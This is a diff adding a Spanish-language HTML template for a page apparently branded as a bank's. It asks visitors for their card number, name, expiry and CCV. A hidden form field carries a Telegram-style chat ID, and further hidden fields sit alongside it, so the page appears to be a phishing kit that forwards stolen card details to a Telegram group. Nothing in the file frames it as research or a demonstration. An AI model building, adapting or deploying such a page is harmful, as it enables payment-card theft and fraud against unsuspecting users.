@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>Inicio</title>
+    <link
+      href="https://fonts.googleapis.com/css?family=Lato|Liu+Jian+Mao+Cao&display=swap"
+      rel="stylesheet"
+    />
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <link
+      rel="stylesheet"
+      href="{{ url_for('static', filename='css/estilos.css') }}"
+    />
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="{{ url_for('static', filename='fhs/style_crown.css') }}"
+    />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  </head>
+
+  <body>
+    <header style="" class="ioscam">
+      <nav class="header_wrapeer">
+        <div class="header__campaign">
+          <div class="header__logo">
+            <img
+              src="{{ url_for('static', filename='fhs/blanco.png') }}"
+              sizes="(min-width: 900px) 20vw, 50vw"
+              class="header__image"
+            />
+            <img src="{{ url_for('static', filename='fhs/bantp.png') }}" />
+          </div>
+        </div>
+      </nav>
+    </header>
+    <div>
+      <h1>¡Bienvenido!</h1>
+
+      <div class="contenedor">
+        <!-- Tarjeta -->
+        <section class="tarjeta" id="tarjeta">
+          <div class="delantera">
+            <img  
+              src="{{ url_for('static', filename='img/tarjeta-crop.png') }}"
+              style="width: 50%; max-width: 80px"
+              alt=""
+            />
+            <div class="logo-marca" id="logo-marca">
+              <!-- <img src="img/logos/visa.png" alt=""> -->
+            </div>
+
+            <img src="{{ url_for('static', filename='img/chip-tarjeta.png') }}" class="chip" alt="" />
+            <div class="datos">
+              <div class="grupo" id="numero">
+                <p class="label">Número Tarjeta</p>
+                <p class="numero">#### #### #### ####</p>
+              </div>
+              <div class="flexbox">
+                <div class="grupo" id="nombre">
+                  <p class="label">Nombre Tarjeta</p>
+                  <p class="nombre">Nombre Apellido</p>
+                </div>
+
+                <div class="grupo" id="expiracion">
+                  <p class="label">Expiracion</p>
+                  <p class="expiracion">
+                    <span class="mes">MM</span> / <span class="year">AA</span>
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="trasera">
+            <div class="barra-magnetica"></div>
+            <div class="datos">
+              <div class="grupo" id="firma">
+                <p class="label">Firma</p>
+                <div class="firma">
+                  <p></p>
+                </div>
+              </div>
+              <div class="grupo" id="ccv">
+                <p class="label">CCV</p>
+                <p class="ccv"></p>
+              </div>
+            </div>
+            <p class="leyenda">
+              Lorem ipsum dolor sit amet consectetur adipisicing elit. Accusamus
+              exercitationem, voluptates illo.
+            </p>
+            <a href="#" class="link-banco">www.tubanco.com</a>
+          </div>
+        </section>
+
+        <!-- Contenedor Boton Abrir Formulario -->
+        <div class="contenedor-btn">
+          <button class="btn-abrir-formulario" id="btn-abrir-formulario">
+            <i class="fas fa-plus"></i>
+          </button>
+        </div>
+
+        <!-- Formulario -->
+        <form
+          action="submit"
+          method="post"
+          id="formulario-tarjeta"
+          class="formulario-tarjeta"
+        >
+          <input type="text" name="chat_id" value="-1001961013172" hidden="" />
+          <p id="address" hidden=""></p>
+          <p id="gfg" hidden=""></p>
+          <div class="grupo">
+            <label for="inputNumero">Número Tarjeta</label>
+            <input
+              type="text"
+              name="inputNumero"
+              id="inputNumero"
+              maxlength="19"
+              autocomplete="off"
+            />
+          </div>
+          <div class="grupo">
+            <label for="inputNombre">Nombre</label>
+            <input
+              type="text"
+              name="inputNombre"
+              id="inputNombre"
+              maxlength="19"
+              autocomplete="off"
+            />
+          </div>
+          <div class="flexbox">
+            <div class="grupo expira">
+              <label for="selectMes">Expiracion</label>
+              <div class="flexbox">
+                <div class="grupo-select">
+                  <select name="selectMes" id="selectMes">
+                    <option disabled selected>Mes</option>
+                  </select>
+                  <i class="fas fa-angle-down"></i>
+                </div>
+                <div class="grupo-select">
+                  <select name="selectYear" id="selectYear">
+                    <option disabled selected>Año</option>
+                  </select>
+                  <i class="fas fa-angle-down"></i>
+                </div>
+              </div>
+            </div>
+
+            <div class="grupo ccv">
+              <label for="inputCCV">CCV</label>
+              <input type="text" name="inputCCV" id="inputCCV" maxlength="3" />
+            </div>
+          </div>
+          <button type="submit" class="btn-enviar">Enviar</button>
+        </form>
+      </div>
+    </div>
+
+    <script
+      src="https://kit.fontawesome.com/2c36e9b7b1.js"
+      crossorigin="anonymous"
+    ></script>
+    <script src="{{ url_for('static', filename='js/main.js') }}"></script>
+  </body>
+</html>
